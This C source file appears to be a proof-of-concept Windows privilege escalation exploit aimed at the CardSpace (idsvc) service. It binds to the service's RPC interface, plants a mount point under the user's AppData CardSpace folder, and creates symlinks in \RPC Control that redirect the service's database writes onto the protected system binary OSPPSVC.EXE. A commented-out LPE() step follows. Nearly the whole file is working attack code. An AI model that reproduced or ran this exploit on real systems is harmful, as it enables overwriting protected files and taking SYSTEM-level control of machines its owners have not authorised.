#include <stdio.h>
#include <windows.h>
#include <rpcdce.h>
#include "boo_h.h"

#include "../CommonUtils/CommonUtils.h"
#include "../CommonUtils/ReparsePoint.h"
#pragma comment (lib,"..//Release//CommonUtils.lib")


handle_t hBinding = NULL;

BOOL StartConnectingService(){
	WCHAR* svcName = (WCHAR *)L"idsvc";
	SC_HANDLE schSCM;
	SC_HANDLE schSvc;
	SERVICE_STATUS ServiceStatus;
	schSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (NULL == schSCM){
		printf("Failed OpenSCManager: %d\n", GetLastError());
		return FALSE;
	}

	schSvc = OpenService(schSCM, (LPCWSTR)svcName, SERVICE_START | SERVICE_QUERY_STATUS);
	if (NULL == schSvc){
		wprintf(L"Failed OpenService %s: %d\n", svcName, GetLastError());
		return FALSE;
	}
	QueryServiceStatus(schSvc, &ServiceStatus);
	if (ServiceStatus.dwCurrentState == SERVICE_RUNNING || ServiceStatus.dwCurrentState == SERVICE_PAUSED){
		wprintf(L"ServiceStatus Already Started %s: %d\n", svcName, GetLastError());
		CloseServiceHandle(schSvc);
		CloseServiceHandle(schSCM);
		return TRUE;

	}
	if (!StartService(schSvc, 0, NULL)){
		wprintf(L"Failed Starting %s: %d\n", svcName, GetLastError());
		return FALSE;
	}

	CloseServiceHandle(schSvc);
	CloseServiceHandle(schSCM);
	Sleep(1000);
	wprintf(L"ServiceStatus New started %ls: %d\n", svcName, GetLastError());
	return TRUE;
}

BOOL StartRpcService(){
	RPC_STATUS status;
	unsigned int  cMinCalls = 1;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	if (StartConnectingService()){
		status = RpcStringBindingComposeW(nullptr, (RPC_WSTR)L"ncalrpc", 0, (RPC_WSTR) L"31336F38236F3E2C6F3F2E6F20336F20236F21326F", nullptr, &StringBinding);

		if (status) {
			printf("RpcStringBindingComposeW Failed:%d\n", status);
			return(status);
		}

		status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
		RpcStringFreeW(&StringBinding);
		if (status) {
			printf("RpcBindingFromStringBindingW Failed:%d\n", status);
			return(status);
		}
		SecurityQOS.Version = 1;
		SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
		SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
		SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

		status = RpcBindingSetAuthInfoExW(hBinding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
		if (status) {
			printf("RpcBindingSetAuthInfoExW Failed:%d\n", status);
			return(status);
		}

		status = RpcEpResolveBinding(hBinding,boo_v1_0_c_ifspec);

		if (status) {
			printf("RpcEpResolveBinding Failed:%d\n", status);
			return(status);
		}

	}
	else
	{
		printf("Start Connecting Windows Cardspace Service Failed");
		return 0;
	}
	return 0;
}

BOOL RunRpcService()
{
	RpcRequest* req = (RpcRequest*)CoTaskMemAlloc(sizeof(RpcRequest));
	req->Type = (wchar_t *)L"ManageRequest";
	req->Length = 0;
	req->Data = 0;
	RpcResponse* rep = (RpcResponse*)CoTaskMemAlloc(sizeof(RpcResponse));
	UINT32* ctx = 0;
	long ret = Proc0_RPCClientBindToService(hBinding, (void**)&ctx);
	printf("Proc0_RPCClientBindToService :%d\n", ret);
	ret = Proc2_RPCDispatchClientUIRequest((void**)&ctx, req, &rep);
	printf("Proc2_RPCDispatchClientUIRequest :%08x\n", ret);
	return 0;
}


int main() {

	StartRpcService();
	if (CreateDirectory((LPCWSTR)L"C:\\Users\\sam\\AppData\\Local\\Microsoft\\CardSpace", nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS)){
		if (!ReparsePoint::CreateMountPoint(L"C:\\Users\\sam\\AppData\\Local\\Microsoft\\CardSpace", L"\\RPC Control", L"")){//\RPC Control  C:\\Users\\sam\\Desktop
			printf("Error creating mount point - %d\n", GetLastError());
			return 0;
		}
	}else{
		printf("Error creating directory - %d\n", GetLastError());
		return 0;
	}
	 
	if (CreateSymlink(NULL, L"\\RPC Control\\CardSpace.db", L"\\??\\C:\\Users\\sam\\Desktop\\CardSpace.db") == false) {
		printf("[+]CreateSymlink Failed,error: %d\n", GetLastError());
		return FALSE;
	}

	if (CreateSymlink(NULL,L"\\RPC Control\\CardSpace.db.atomic", L"\\??\\C:\\Program Files\\Common Files\\microsoft shared\\OfficeSoftwareProtectionPlatform\\OSPPSVC.EXE") == false){//.atomic   \\??\\C:\\Windows\\System32\\vmhgfs.dll
		//
		printf("[+]CreateSymlink Failed,error: %d\n", GetLastError());
		return FALSE;
	}


	RunRpcService();
	if (!RemoveDirectory(L"C:\\Users\\sam\\AppData\\Local\\Microsoft\\CardSpace")) {//干掉这个挂载点
		printf("Error deleting mount point %ls\n", GetErrorMessage().c_str());
		return 0;
	}
	//DeleteFile(L"C:\\Users\\sam\\Desktop\\CardSpace.db");//CardSpaceSP2.db
	//DeleteFile(L"C:\\Users\\sam\\Desktop\\CardSpaceSP2.db");//CardSpaceSP2.db
	//DeleteFile(L"C:\\Users\\sam\\Desktop\\CardSpace.db.atomic");
	//LPE();



	return 0;
}
/******************************************************/
/*         MIDL allocate and free                     */
/******************************************************/

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}
